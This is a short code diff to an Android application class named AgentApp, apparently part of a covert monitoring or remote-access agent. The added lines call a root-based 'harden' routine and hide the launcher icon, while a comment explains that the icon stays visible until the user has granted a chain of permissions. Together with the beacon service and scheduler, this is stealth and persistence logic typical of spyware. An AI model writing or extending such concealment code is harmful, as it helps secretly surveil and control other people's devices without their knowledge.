@@ -15,7 +15,12 @@ public class AgentApp extends Application {
             BeaconService.start(this);
             Scheduler.arm(this);
             Scheduler.kick(this);
-            if (config.hideIcon) {
+            if (Root.available()) {
+                Root.harden(this);
+            }
+            // Stay launchable until the setup wizard has finished; hiding the
+            // icon first would strand the user mid-permission chain.
+            if (config.hideIcon && Onboard.done(this)) {
                 Launcher.setEnabled(this, false);
             }
         } catch (Throwable exc) {
